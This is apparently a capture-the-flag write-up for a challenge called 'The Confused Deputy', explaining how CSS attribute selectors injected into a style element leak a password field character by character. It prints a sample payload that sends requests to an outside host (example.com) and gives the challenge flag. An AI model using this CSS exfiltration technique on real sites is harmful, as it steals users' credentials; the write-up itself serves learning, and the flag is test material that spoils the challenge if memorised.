# The Confused Deputy

Source: [index.html](./index.html)

By reading the source, we se that we can inject arbitary values into a `<style>` element. However, the angle brackets are filtered out. This means that we have to use CSS injection to read the `password` field. By using CSS attribute selectors, we can send http requests to our server when the password matches a certain prefix. For instance, `input[value^='c']{{background-image:url(http://example.com/c)}}` will send a request if the password field starts with "c". We can extract the full password using a technique similar to blind SQL injection.

Script: [exploit.py](./exploit.py)

Flag: csictf{cssxss}
